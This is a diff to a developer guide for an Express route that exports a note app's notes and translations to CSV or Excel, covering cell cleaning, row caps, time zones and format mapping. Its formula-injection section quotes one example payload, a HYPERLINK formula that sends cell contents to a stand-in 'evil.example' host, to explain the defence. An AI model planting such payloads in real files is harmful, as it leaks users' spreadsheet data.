@@ -3,12 +3,12 @@
 `exportRoutes.js` is the Express router that lets a user **download their notes or translations as a spreadsheet** (`.csv` or `.xlsx`). It accepts the same filters as the list pages, so **what the user sees in a filtered list is what they get in the file**.
 
 ```
-React (Export button)  ──►  GET /export?type=notes&format=xlsx&notebook=...
+React (ExportForm)  ──►  GET /export?type=notes&format=xlsx&notebook=...
                                      │
                                      ▼
                      validate → build Mongo filter → fetch → rows → file
                                      │
-React  ◄── file download (Content-Disposition: attachment; filename="note-nest-notes-2026-11-12.xlsx")
+React  ◄── file download (Content-Disposition: attachment; filename="note-nest-notes-2026-11-13.xlsx")
 ```
 
 ---
@@ -18,14 +18,14 @@ React  ◄── file download (Content-Disposition: attachment; filename="note-
 1. [Route Summary](#1-route-summary)
 2. [Imports & Setup](#2-imports--setup)
 3. [Formatting Helpers](#3-formatting-helpers)
-4. [safeCell() — Formula Injection Protection](#4-safecell--formula-injection-protection)
+4. [Cell Cleaning: safeCell() and capCell()](#4-cell-cleaning-safecell-and-capcell)
 5. [Filter Helpers](#5-filter-helpers)
 6. [The EXPORTS Config Object](#6-the-exports-config-object)
-7. [File Builders](#7-file-builders)
+7. [File Builders & the FILE_FORMATS Map](#7-file-builders--the-file_formats-map)
 8. [GET /export — The Route](#8-get-export--the-route)
 9. [Calling It from React](#9-calling-it-from-react)
 10. [Status Code Reference](#10-status-code-reference)
-11. [Known Gaps & Housekeeping](#11-known-gaps--housekeeping)
+11. [Resolved Gaps & Remaining Housekeeping](#11-resolved-gaps--remaining-housekeeping)
 
 ---
 
@@ -41,8 +41,8 @@ The router is mounted at **`/export`** in `app.js`. There's a **single route**.
 
 | Param | Required | Applies To | Values |
 |---|---|---|---|
-| `type` | ✅ | — | `notes` \| `translations` |
-| `format` | ✅ | — | `csv` \| `xlsx` (from `FORMATS` in `apiUtil`) |
+| `type` | ✅ | — | `notes` \| `translations` (the keys of `EXPORTS`) |
+| `format` | ✅ | — | `csv` \| `xlsx` (the keys of `FILE_FORMATS`) |
 | `language` | ❌ | notes | A language code, e.g. `af` |
 | `notebook` | ❌ | notes | A notebook ObjectId |
 | `tag` | ❌ | notes | A tag ObjectId |
@@ -50,6 +50,11 @@ The router is mounted at **`/export`** in `app.js`. There's a **single route**.
 | `targetLanguage` | ❌ | translations | A language code |
 
 An empty optional filter (`?language=`) means **"any"**, the same as leaving it out.
+
+### Limits
+
+- At most **`MAX_EXPORT_ROWS` (10,000) rows** per file. If there were more, the response says so in the `X-Export-Truncated` header ([Step 4](#step-4-fetch-with-the-row-cap)).
+- Rate-limited **per IP** by `exportLimiter`, because an export is a heavy request (database query + file build).
 
 ### Examples
 
@@ -66,7 +71,6 @@ GET /export?type=translations&format=xlsx&sourceLanguage=af&targetLanguage=en
 ## 2. Imports & Setup
 
 ```js
-require('dotenv').config()
 const express = require('express');
 const mongoose = require('mongoose');
 const XLSX = require('xlsx');
@@ -77,23 +81,30 @@ const { checkJwtToken } = require('../middleware/securityMiddleware');
 const { exportLimiter } = require('../middleware/rateLimitMiddleware');
 const { languageCodeRegex } = require('../util/schemaUtil');
 const { languageData } = require('../util/languageData');
-const { FORMATS, MAX_EXPORT_ROWS } = require('../util/apiUtil')
+const { MAX_EXPORT_ROWS, EXPORT_TIME_ZONE } = require('../util/apiUtil');
+const router = express.Router();
+
+const EXCEL_MAX_CELL_CHARS = 32767;
+const UTF8_BOM = '﻿';
 ```
 
-| Import | From | Used For |
+| Import / Constant | From | Used For |
 |---|---|---|
-| `dotenv` | npm | Loads `.env`. It isn't used directly in this file. |
 | `express` | npm | Creates the `router` |
 | `mongoose` | npm | `ObjectId.isValid()` for the `notebook` and `tag` filters |
 | `XLSX` | npm `xlsx` (SheetJS) | Builds the `.xlsx` workbook in memory |
 | `stringify` | npm `csv-stringify/sync` | Turns rows into CSV text. It handles quoting of commas, quotes and line breaks. |
 | `Note`, `Translation` | models | The two collections that can be exported |
 | `checkJwtToken` | `securityMiddleware` | Only logged-in users can export, and only their own data |
-| `exportLimiter` | `rateLimitMiddleware` | Exports are heavy (database query + file build), so they're rate-limited separately |
+| `exportLimiter` | `rateLimitMiddleware` | Exports are heavy, so they're rate-limited separately |
 | `languageCodeRegex` | `util/schemaUtil` | Validates the language filters, using the same rule as the schemas |
 | `languageData` | `util/languageData` | Shows `Afrikaans` instead of `af` in the file |
-| `FORMATS` | `util/apiUtil` | The allowed formats, e.g. `['csv', 'xlsx']` |
-| `MAX_EXPORT_ROWS` | `util/apiUtil` | The maximum number of rows per file |
+| `MAX_EXPORT_ROWS` | `util/apiUtil` | The maximum number of rows per file (10,000) |
+| `EXPORT_TIME_ZONE` | `util/apiUtil` | `'Africa/Johannesburg'`. Dates in the file and the filename use South African time. |
+| `EXCEL_MAX_CELL_CHARS` | this file | Excel's per-cell limit, used by `capCell()` |
+| `UTF8_BOM` | this file | The byte order mark at the start of every CSV ([section 7](#buildcsv)) |
+
+`dotenv` isn't imported. `app.js` loads it before any router is required.
 
 ### Packages to install
 
@@ -125,23 +136,34 @@ Object.fromEntries(...)// { af: 'Afrikaans', zu: 'Zulu' }
 | `'xx'` (unknown) | `'xx'`, the code itself |
 | `undefined` / `''` | `''`, an empty cell |
 
-### `formatDate()`
+### `formatDate()` and `todayDate()`
 
 ```js
-const formatDate = (date) => (date ? new Date(date).toISOString().replace('T', ' ').slice(0, 19) : '');
+const formatDate = (date) => (date ? new Date(date).toLocaleString('sv-SE', { timeZone: EXPORT_TIME_ZONE }) : '');
+const todayDate = () => new Date().toLocaleDateString('sv-SE', { timeZone: EXPORT_TIME_ZONE });
 ```
 
-| Step | Value |
-|---|---|
-| `toISOString()` | `2026-11-09T14:03:22.517Z` |
-| `.replace('T', ' ')` | `2026-11-09 14:03:22.517Z` |
-| `.slice(0, 19)` | `2026-11-09 14:03:22` |
+| Function | Example | Used For |
+|---|---|---|
+| `formatDate(note.createdAt)` | `2026-11-09 16:03:22` | The "Date Added" and "Last Updated" cells |
+| `todayDate()` | `2026-11-13` | The date in the filename |
 
-This produces a readable, sortable date that spreadsheet apps recognise. Times are in **UTC** (see [Gap 3](#gap-3-dates-are-utc-not-south-african-time)).
+Dates are stored in MongoDB as **UTC**. South Africa is **UTC+2**, so converting with `timeZone: 'Africa/Johannesburg'` shows the time the user actually saw, and an export made just after midnight gets **today's** date in the filename, not yesterday's.
+
+**Why `sv-SE`?** The Swedish locale happens to format dates as `YYYY-MM-DD HH:mm:ss`. That's readable, sorts correctly as text, and spreadsheet apps recognise it as a date. It's a common trick; the language of the file isn't affected. (This needs Node's full ICU data, which is the default since Node 13.)
 
 ---
 
-## 4. safeCell() — Formula Injection Protection
+## 4. Cell Cleaning: safeCell() and capCell()
+
+Each file format needs a different clean-up on its data cells. The right one is chosen by `FILE_FORMATS` ([section 7](#7-file-builders--the-file_formats-map)).
+
+| Format | Cleaner | Why |
+|---|---|---|
+| `csv` | `safeCell()` | Formula injection is a CSV problem |
+| `xlsx` | `capCell()` | `.xlsx` cells are always text, but Excel rejects cells over 32,767 characters |
+
+### `safeCell()`: formula injection protection (CSV)
 
 ```js
 const safeCell = (value) => {
@@ -150,9 +172,7 @@ const safeCell = (value) => {
 };
 ```
 
-### The attack
-
-Spreadsheet apps treat a cell that starts with `=`, `+`, `-` or `@` as a **formula**. If a user (or someone who shares content with them) saves a note titled:
+**The attack.** Spreadsheet apps treat a CSV cell that starts with `=`, `+`, `-` or `@` as a **formula**. If a user saves a note titled:
 
 ```
 =HYPERLINK("http://evil.example/?d="&A2, "Click me")
@@ -160,9 +180,7 @@ Spreadsheet apps treat a cell that starts with `=`, `+`, `-` or `@` as a **formu
 
 then opening the exported CSV in Excel could run that formula. That can **leak data** from other cells, or, in older setups, run commands. This is known as **CSV / formula injection** (OWASP).
 
-### The fix
-
-A leading apostrophe `'` tells Excel to treat the cell as **text**:
+**The fix.** A leading apostrophe `'` tells Excel to treat the cell as **text**:
 
 | Original | Exported |
 |---|---|
@@ -178,6 +196,18 @@ A leading apostrophe `'` tells Excel to treat the cell as **text**:
 | `[=+\-@\t\r]` | `=`, `+`, `-` (escaped), `@`, tab, carriage return |
 
 Tab and carriage return are included because some apps strip leading whitespace **before** deciding whether a cell is a formula.
+
+**Why not for `.xlsx`?** SheetJS's `aoa_to_sheet` stores JavaScript strings as **text cells** (type `s`, with no formula), so Excel never runs them. Adding the apostrophe there would only make it **show up in the cell** (`'- todo`).
+
+### `capCell()`: Excel's cell limit (`.xlsx`)
+
+```js
+const capCell = (value) => (typeof value === 'string' && value.length > EXCEL_MAX_CELL_CHARS
+    ? value.slice(0, EXCEL_MAX_CELL_CHARS)
+    : value);
+```
+
+An Excel cell can hold at most **32,767 characters**. A longer note's `plainText` would make Excel report the file as damaged and offer to "repair" it. `capCell` cuts the text to the limit so the file always opens. CSV files keep the **full** text (see [Still open](#still-open)).
 
 ---
 
@@ -222,7 +252,7 @@ const EXPORTS = {
 |---|---|---|
 | `sheetName` | string | The worksheet tab name in `.xlsx` |
 | `buildFilter(userId, query)` | function | Validates the query and returns `{ filter }` or `{ error }` |
-| `fetch(filter)` | function | Runs the Mongo query and returns plain objects |
+| `fetch(filter, limit)` | function | Runs the Mongo query (up to `limit` rows) and returns plain objects |
 | `columns` | array | `[header, (doc) => cellValue]` pairs that define the columns |
 
 **Adding a new export type** (e.g. `notebooks`) means adding one entry here. The route doesn't change.
@@ -249,7 +279,7 @@ if (tag) filter.tags = tag;
 ```js
 Note.find(filter)
     .sort({ isPinned: -1, updatedAt: -1 })// Pinned first, then newest — same as the NotesList table
-    .limit(MAX_EXPORT_ROWS)
+    .limit(limit)
     .select('title plainText language notebook tags isPinned createdAt updatedAt')
     .populate('notebook', 'name')
     .populate('tags', 'name')
@@ -268,8 +298,8 @@ Note.find(filter)
 | Notebook | `n.notebook?.name` (blank if there's no notebook) |
 | Tags | Tag names joined with `, ` → `work, urgent` |
 | Pinned | `Yes` / `No` |
-| Date Added | `formatDate(n.createdAt)` |
-| Last Updated | `formatDate(n.updatedAt)` |
+| Date Added | `formatDate(n.createdAt)` (SAST) |
+| Last Updated | `formatDate(n.updatedAt)` (SAST) |
 
 The tags column breaks down like this:
 
@@ -285,12 +315,16 @@ The tags column breaks down like this:
 **Filter:** the same as `GET /translation/fetch`.
 
 ```js
-const filter = { user: userId };
+const filter = { user: userId, isArchived: { $ne: true }, deletedAt: null };
 if (sourceLanguage) filter.sourceLanguage = sourceLanguage;
 if (targetLanguage) filter.targetLanguage = targetLanguage;
 ```
 
-**Query:** newest first, the linked note's title populated.
+| Part | Meaning |
+|---|---|
+| `isArchived: { $ne: true }, deletedAt: null` | **Active translations only.** `$ne: true` also matches older translations saved before the field existed. |
+
+**Query:** newest first (`createdAt: -1`, the same as the TranslationsList table), with the linked note's title populated.
 
 **Columns:**
 
@@ -302,20 +336,20 @@ if (targetLanguage) filter.targetLanguage = targetLanguage;
 | Target Language | `languageName(t.targetLanguage)` |
 | Note | `t.note?.title` (blank if it isn't linked to a note) |
 | Characters | `t.characterCount ?? ''` |
-| Date Added | `formatDate(t.createdAt)` |
+| Date Added | `formatDate(t.createdAt)` (SAST) |
 
 `??` vs `||`: `characterCount ?? ''` keeps a real `0`. `|| ''` would turn `0` into a blank cell.
 
 ---
 
-## 7. File Builders
+## 7. File Builders & the FILE_FORMATS Map
 
 ### `toRows()`: documents → a 2-D array
 
 ```js
-const toRows = (docs, columns) => [
+const toRows = (docs, columns, cleanCell) => [
     columns.map(([header]) => header),// Row 1: headers
-    ...docs.map((doc) => columns.map(([, getValue]) => safeCell(getValue(doc) ?? ''))),// Row 2+: data
+    ...docs.map((doc) => columns.map(([, getValue]) => cleanCell(getValue(doc) ?? ''))),// Row 2+: data
 ];
 ```
 
@@ -334,21 +368,20 @@ The output is an **array of arrays** (often called "AOA"), which both CSV and XL
 | `([header]) =>` | Takes only the first item of each `[header, fn]` pair |
 | `([, getValue]) =>` | **Skips** the first item (the leading comma) and takes the function |
 | `getValue(doc) ?? ''` | `null`/`undefined` becomes an empty cell |
-| `safeCell(...)` | Formula injection protection on **every** data cell |
+| `cleanCell(...)` | The format's cleaner on **every** data cell: `safeCell` for CSV, `capCell` for `.xlsx` |
 
 ### `buildCsv()`
 
 ```js
-const buildCsv = (rows) => Buffer.from('﻿' + stringify(rows), 'utf8');
+const UTF8_BOM = '﻿';
+const buildCsv = (rows) => Buffer.from(UTF8_BOM + stringify(rows), 'utf8');
 ```
 
 | Piece | Why |
 |---|---|
 | `stringify(rows)` | Builds proper CSV: values containing `,`, `"` or line breaks are wrapped in quotes and inner quotes are doubled |
-| `'﻿'` (BOM) | The **byte order mark**. Without it, Excel guesses the encoding and garbles characters like `ê`, `ô`, `ñ` or non-Latin scripts (e.g. `môre` → `mÃ´re`). |
+| `UTF8_BOM` | The **byte order mark**. Without it, Excel guesses the encoding and garbles characters like `ê`, `ô`, `ñ` or non-Latin scripts (e.g. `môre` → `mÃ´re`). It's written as the escape `'﻿'`, so it's visible in the source and an editor can't strip it without anyone noticing. |
 | `Buffer.from(..., 'utf8')` | Converts to bytes, so `Content-Length` is in **bytes**, not characters |
-
-In the source file the BOM is an **invisible character** between the quotes. Writing it as `'﻿'` makes it visible and stops an editor from removing it without anyone noticing (see [Housekeeping](#housekeeping)).
 
 ### `buildXlsx()`
 
@@ -372,14 +405,22 @@ width   = Math.min( Math.max(longest, 10), 60 )
 
 So short columns don't get squashed, and a long `Content` column doesn't stretch across the whole screen.
 
-### `CONTENT_TYPES`
+### `FILE_FORMATS`: one place for everything about a format
 
-| Format | MIME Type |
+```js
+const FILE_FORMATS = {
+    csv:  { contentType: 'text/csv; charset=utf-8', cleanCell: safeCell, build: (rows) => buildCsv(rows) },
+    xlsx: { contentType: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', cleanCell: capCell, build: (rows, sheetName) => buildXlsx(rows, sheetName) },
+};
+```
+
+| Key | Purpose |
 |---|---|
-| `csv` | `text/csv; charset=utf-8` |
-| `xlsx` | `application/vnd.openxmlformats-officedocument.spreadsheetml.sheet` |
+| `contentType` | The MIME type. It tells the browser it's a download and lets the operating system pick the right app. |
+| `cleanCell` | The cell cleaner for this format ([section 4](#4-cell-cleaning-safecell-and-capcell)) |
+| `build(rows, sheetName)` | Builds the file as a Buffer |
 
-The correct MIME type tells the browser it's a download and lets the operating system pick the right app to open it.
+The route validates `format` **against this map**, so the allowed formats, their MIME types and their builders can't drift apart. Adding a format (e.g. `json`) means adding one entry here; until then, `?format=json` is a 400.
 
 ---
 
@@ -396,7 +437,7 @@ format valid? ───► 400 "Invalid export format"
      ▼
 buildFilter() ───► 400 "Invalid language code" / "Invalid notebook id" / ...
      ▼
-fetch(filter) → toRows() → buildCsv() / buildXlsx()
+fetch(filter, MAX + 1) → truncated? → toRows() → build()
      ▼
 filename + headers → 200 file
 ```
@@ -421,10 +462,11 @@ Without `hasOwn`, `?type=toString` would pass the check and crash later with a 5
 ### Step 2: Validate `format`
 
 ```js
-if (!FORMATS.includes(format)) → 400
+const fileFormat = typeof format === 'string' && Object.hasOwn(FILE_FORMATS, format) ? FILE_FORMATS[format] : null;
+if (!fileFormat) → 400
 ```
 
-`includes` uses strict equality, so an array (`?format=csv&format=xlsx`) or an object never matches.
+The same pattern as `type`. An array (`?format=csv&format=xlsx`) or an object fails the string check.
 
 ### Step 3: Build the filter
 
@@ -435,42 +477,52 @@ if (error) → 400
 
 `buildFilter` returns **either** `{ filter }` **or** `{ error }`, never both, and it never throws. Destructuring both makes the check one line.
 
-### Step 4: Fetch and build the file
+### Step 4: Fetch with the row cap
 
 ```js
-const docs = await exportType.fetch(filter);
-const rows = toRows(docs, exportType.columns);
-const file = format === 'csv' ? buildCsv(rows) : buildXlsx(rows, exportType.sheetName);
+const fetched = await exportType.fetch(filter, MAX_EXPORT_ROWS + 1);
+const truncated = fetched.length > MAX_EXPORT_ROWS;
+const docs = truncated ? fetched.slice(0, MAX_EXPORT_ROWS) : fetched;
+```
+
+Asking for **one more row than the cap** is a cheap way to find out whether there were more rows, without a separate `countDocuments()` query. If the extra row comes back, the file is cut at `MAX_EXPORT_ROWS` and `truncated` is `true`, which the response reports in a header ([Step 7](#step-7-response-headers)).
+
+### Step 5: Build the file
+
+```js
+const rows = toRows(docs, exportType.columns, fileFormat.cleanCell);
+const file = fileFormat.build(rows, exportType.sheetName);
 ```
 
 If nothing matches the filter, the file still downloads, with **headers only**. That's not an error.
 
-### Step 5: Build the filename
+### Step 6: Build the filename
 
 ```js
 const filtered = Object.keys(filter).some((key) => !['user', 'isArchived', 'deletedAt'].includes(key));
-const date = new Date().toISOString().slice(0, 10);
-const filename = `note-nest-${type}${filtered ? '-filtered' : ''}-${date}.${format}`;
+const filename = `note-nest-${type}${filtered ? '-filtered' : ''}-${todayDate()}.${format}`;
 ```
 
 `filtered` is `true` if the filter has **any key besides the fixed ones**, i.e. the user applied a filter:
 
 | Filter Keys | `filtered` | Filename |
 |---|---|---|
-| `user, isArchived, deletedAt` | `false` | `note-nest-notes-2026-11-12.xlsx` |
-| `user, isArchived, deletedAt, tags` | `true` | `note-nest-notes-filtered-2026-11-12.xlsx` |
-| `user, sourceLanguage` | `true` | `note-nest-translations-filtered-2026-11-12.csv` |
+| `user, isArchived, deletedAt` | `false` | `note-nest-notes-2026-11-13.xlsx` |
+| `user, isArchived, deletedAt, tags` | `true` | `note-nest-notes-filtered-2026-11-13.xlsx` |
+| `user, isArchived, deletedAt, sourceLanguage` | `true` | `note-nest-translations-filtered-2026-11-13.csv` |
 
 The filename is built **only** from validated values (`type` and `format` are whitelisted, and the date is generated by the server), so it can't be used to inject extra headers.
 
-### Step 6: Response headers
+### Step 7: Response headers
 
 ```js
 res.set({
-    'Content-Type': CONTENT_TYPES[format],
+    'Content-Type': fileFormat.contentType,
     'Content-Disposition': `attachment; filename="${filename}"`,
     'Content-Length': file.length,
     'Cache-Control': 'no-store',
+    'X-Export-Rows': String(docs.length),
+    'X-Export-Truncated': String(truncated),
 });
 return res.status(200).send(file);
 ```
@@ -481,40 +533,43 @@ return res.status(200).send(file);
 | `Content-Disposition: attachment` | **Download** the file instead of displaying it, using this filename |
 | `Content-Length` | The size in bytes (`file` is a Buffer, so `.length` is bytes). Lets the browser show download progress. |
 | `Cache-Control: no-store` | The file holds private data. Browsers and proxies must not keep a copy. |
+| `X-Export-Rows` | How many data rows are in the file |
+| `X-Export-Truncated` | `'true'` if there were more than `MAX_EXPORT_ROWS` rows and the file was cut short, otherwise `'false'` |
 
 ---
 
 ## 9. Calling It from React
 
-Because the JWT is an **HTTP-only cookie**, the browser sends it automatically. There are two ways to start the download.
-
-### Option A: a plain link (simplest)
-
-```jsx
-const params = new URLSearchParams({ type: 'notes', format: 'xlsx', notebook: selectedNotebook || '' });
-<a href={`/export?${params}`}>Export to Excel</a>// Browser downloads using Content-Disposition
-```
-
-This only works when the frontend and API are on the **same origin** (or behind a proxy). There's no way to show an error message, because a 400 or 429 opens as a JSON page.
-
-### Option B: fetch + blob (better error handling)
+`ExportForm.js` (used by `NotesList.js` and `TranslationsList.js`) uses **fetch + blob**, so it can show error messages and the truncation warning instead of opening a JSON page:
 
 ```js
-const exportFile = async (query) => {
-    const res = await fetch(`/export?${new URLSearchParams(query)}`, { credentials: 'include' });// Send the auth cookie
-    if (!res.ok) {
-        const { message } = await res.json().catch(() => ({}));// Errors come back as JSON
-        throw new Error(message || 'Export failed');
-    }
-    const filename = res.headers.get('Content-Disposition')?.match(/filename="(.+)"/)?.[1] || 'export';// Use the server's filename
-    const url = URL.createObjectURL(await res.blob());// Turn the file into a temporary URL
-    const link = Object.assign(document.createElement('a'), { href: url, download: filename });
-    link.click();// Trigger the download
-    URL.revokeObjectURL(url);// Free the memory
-};
+const params = new URLSearchParams({ type, format });
+if (exportFiltered) {
+    exportType.filterKeys.forEach((key) => { if (filters[key]) params.set(key, filters[key]) });// Only filters with a value
+}
+const response = await fetch(`/export?${params.toString()}`, { method: 'GET', credentials: 'include' });// Send the auth cookie
+if (!response.ok) {
+    const data = await response.json().catch(() => ({}));// Errors come back as JSON
+    throw new Error(data.message || 'Export failed.');
+}
+const blob = await response.blob();
+const filename = filenameFromHeader(response.headers.get('Content-Disposition')) || `${exportType.filename}.${format}`;// Use the server's filename
+// ...create a temporary <a download>, click it, then revoke the object URL
+
+const truncated = response.headers.get('X-Export-Truncated') === 'true';
+const rowCount = Number(response.headers.get('X-Export-Rows')) || 0;
+setNotice(truncated
+    ? `${filename} downloaded. Only the first ${rowCount.toLocaleString()} rows were exported. Apply a filter to export the rest.`
+    : `${filename} downloaded.`);
 ```
 
-For a **cross-origin** API, the server must also send `Access-Control-Expose-Headers: Content-Disposition`, otherwise `res.headers.get('Content-Disposition')` returns `null`.
+| Piece | From | Purpose |
+|---|---|---|
+| `EXPORT_TYPES[type].filterKeys` | `client/src/util/formUtil.js` | Which list filters to send for each type |
+| `filenameFromHeader()` | `client/src/util/formUtil.js` | Reads the filename out of `Content-Disposition` |
+| Scope select | `ExportForm.js` | When the list is filtered, the user can export the **filtered list** or **all** rows |
+
+The frontend and API are on the **same origin** (the React dev server proxies to the API), so the browser lets the code read `Content-Disposition` and the `X-Export-*` headers. If the API is ever served from a **different origin**, the server must also send `Access-Control-Expose-Headers: Content-Disposition, X-Export-Rows, X-Export-Truncated`. Otherwise `response.headers.get(...)` returns `null`, and the download falls back to the client's filename with no truncation warning.
 
 ---
 
@@ -522,7 +577,7 @@ For a **cross-origin** API, the server must also send `Access-Control-Expose-Hea
 
 | Code | When |
 |---|---|
-| `200` | File sent (possibly headers only, if nothing matched) |
+| `200` | File sent (possibly headers only, if nothing matched; check `X-Export-Truncated` for a cut-short file) |
 | `400` | Invalid `type`, `format`, language code, notebook ID or tag ID |
 | `401` | (From `checkJwtToken`) No token, or an invalid or expired one |
 | `429` | (From `exportLimiter`) Too many exports |
@@ -530,82 +585,31 @@ For a **cross-origin** API, the server must also send `Access-Control-Expose-Hea
 
 ---
 
-## 11. Known Gaps & Housekeeping
+## 11. Resolved Gaps & Remaining Housekeeping
 
-### Gap 1: The apostrophe shows up in `.xlsx` files
+These gaps were found in an earlier review and have now been fixed.
 
-`safeCell` runs on **every** export, but formula injection is a **CSV** problem. SheetJS's `aoa_to_sheet` stores strings as **text cells** (type `s`), which Excel never runs as formulas. So in `.xlsx` files the apostrophe is unnecessary, and it **appears in the cell**: a note titled `- todo` shows as `'- todo`.
-
-**Fix:** apply `safeCell` only for CSV:
-
-```js
-const toRows = (docs, columns, sanitise) => [
-    columns.map(([header]) => header),
-    ...docs.map((doc) => columns.map(([, getValue]) => {
-        const value = getValue(doc) ?? '';
-        return sanitise ? safeCell(value) : value;// Only CSV needs the apostrophe
-    })),
-];
-// In the route:
-const rows = toRows(docs, exportType.columns, format === 'csv');
-```
-
-### Gap 2: Truncation at `MAX_EXPORT_ROWS` is silent
-
-If the user has more rows than `MAX_EXPORT_ROWS`, `.limit()` cuts the export short and **nothing tells them**. Options:
-
-- Fetch `MAX_EXPORT_ROWS + 1` rows. If you get the extra one, drop it and set a header the frontend can read:
-  ```js
-  res.set('X-Export-Truncated', 'true');// Frontend shows "Only the first N rows were exported"
-  ```
-- Or return a 400 asking the user to apply a filter.
-
-### Gap 3: Dates are UTC, not South African time
-
-`formatDate()` and the filename date both use `toISOString()`, which is **UTC**. South Africa is **UTC+2**, so:
-
-- A note saved at 09:00 SAST shows as `07:00:00` in the file.
-- An export made between 00:00 and 02:00 SAST gets **yesterday's** date in the filename.
-
-**Fix** (`sv-SE` is a common trick, because that locale formats dates as `YYYY-MM-DD HH:mm:ss`):
-
-```js
-const formatDate = (date) => (date
-    ? new Date(date).toLocaleString('sv-SE', { timeZone: 'Africa/Johannesburg' })// "2026-11-09 16:03:22"
-    : '');
-const date = new Date().toLocaleDateString('sv-SE', { timeZone: 'Africa/Johannesburg' });// "2026-11-12"
-```
-
-Or label the column headers `(UTC)` so it's clear.
-
-### Gap 4: Excel's 32,767-character cell limit
-
-An Excel cell can hold at most **32,767 characters**. If a note's `plainText` is longer, Excel may report the file as damaged and offer to "repair" it. If very long notes are possible, cap the value:
-
-```js
-['Content', (n) => (n.plainText || '').slice(0, 32767)],// Excel's per-cell maximum
-```
-
-### Gap 5: `FORMATS` and `CONTENT_TYPES` can drift apart
-
-`FORMATS` lives in `apiUtil`, but `CONTENT_TYPES` and the builder choice live here. If someone adds `'json'` to `FORMATS`, it would pass validation, get **no** `Content-Type`, and be built as **xlsx** (the `else` branch). Either derive one from the other:
-
-```js
-if (!Object.hasOwn(CONTENT_TYPES, format)) → 400// CONTENT_TYPES becomes the single source of truth
-```
-
-or keep a builder map, `const BUILDERS = { csv: buildCsv, xlsx: buildXlsx }`, and validate against that.
-
-### Gap 6: The whole file is built in memory
-
-The entire result set, the rows array, and the finished file all sit in memory before sending. `MAX_EXPORT_ROWS` and `exportLimiter` keep that manageable. Streaming (Mongo cursor → `csv-stringify` stream → `res`) is only worth the extra complexity if the limit grows into the tens of thousands.
+| Gap | Fix | Where |
+|---|---|---|
+| 1. The formula-injection apostrophe showed up in `.xlsx` files | `safeCell` only runs for CSV. `toRows` takes the cleaner from `FILE_FORMATS`. Checked: SheetJS stores `=SUM(...)` and `- todo` as text cells (`t: "s"`, no formula). | `exportRoutes.js` `toRows`, `FILE_FORMATS` |
+| 2. Truncation at `MAX_EXPORT_ROWS` was silent | The route fetches `MAX_EXPORT_ROWS + 1` rows. If the extra row comes back, the file is cut at the cap and `X-Export-Truncated: true` is sent with `X-Export-Rows`. `ExportForm.js` shows "Only the first 10,000 rows were exported. Apply a filter to export the rest." | `exportRoutes.js` GET `/`, `ExportForm.js` |
+| 3. Dates were UTC, not South African time | `formatDate()` and the filename date (`todayDate()`) use `EXPORT_TIME_ZONE` (`Africa/Johannesburg`) with the `sv-SE` format. A note saved at 16:03 SAST shows as `16:03:22`, not `14:03:22`. | `exportRoutes.js`, `util/apiUtil.js` |
+| 4. Excel's 32,767-character cell limit | `capCell()` cuts `.xlsx` cell text to `EXCEL_MAX_CELL_CHARS`, so the file always opens | `exportRoutes.js` |
+| 5. `FORMATS` and `CONTENT_TYPES` could drift apart | Replaced by one `FILE_FORMATS` map (content type, cleaner and builder per format). The route validates `format` against it with `Object.hasOwn`. `FORMATS` is removed from `apiUtil.js`. | `exportRoutes.js`, `util/apiUtil.js` |
 
 ### Housekeeping
 
-| Line(s) | Issue | Suggestion |
-|---|---|---|
-| 11 | `require('dotenv').config()` isn't used in this file | Load it once in `app.js` |
-| 25 | The `FORMATS, MAX_EXPORT_ROWS` import has no comment and no semicolon | `const { FORMATS, MAX_EXPORT_ROWS } = require('../util/apiUtil');// Allowed formats and the row cap` |
-| 129 | The BOM is an invisible character in the string literal | Write it as `'﻿'` so it's visible and can't be stripped by accident |
-| 160 | "Conditional rendering" | That's a React UI term. This is a **guard clause** / validation check. |
-| 2–8 | The header doesn't mention `MAX_EXPORT_ROWS` or the rate limiter | Add a line: "Limited to MAX_EXPORT_ROWS rows; rate-limited per IP" |
+- The unused `require('dotenv').config()` is removed (`app.js` loads it).
+- The `apiUtil` import has a comment and a semicolon, and so does `express.Router()`.
+- The BOM is written as `'﻿'` (the `UTF8_BOM` constant) instead of an invisible character.
+- "Conditional rendering" is now "Guard clause".
+- The header block mentions `MAX_EXPORT_ROWS`, the truncation header and the rate limiter.
+- **Dead code removed from `apiUtil.js`:** it had copies of `safeCell`, `toRows`, `buildCsv`, `buildXlsx` and `CONTENT_TYPES` that nothing imported. They were also broken, because `apiUtil.js` never imported `stringify` or `XLSX`, so calling them would have thrown a `ReferenceError`. The working versions live only in `exportRoutes.js`.
+
+### Still open
+
+| Item | Notes |
+|---|---|
+| 6. The whole file is built in memory | The result set, the rows array and the finished file all sit in memory before sending. `MAX_EXPORT_ROWS` and `exportLimiter` keep that manageable. Streaming (Mongo cursor → `csv-stringify` stream → `res`) is only worth the extra complexity if the limit grows into the tens of thousands. |
+| Very long text in CSV | CSV files keep the **full** text, so other apps get everything. Excel can't show more than 32,767 characters in one cell either way: opening such a CSV in **Excel** splits or cuts that cell, while the `.xlsx` export cuts it cleanly so the file opens without a "repair" prompt. |
+| A cut `.xlsx` cell isn't marked | `capCell` cuts silently. If very long notes become common, add a marker such as `…[truncated]` (keeping the total within the limit). |
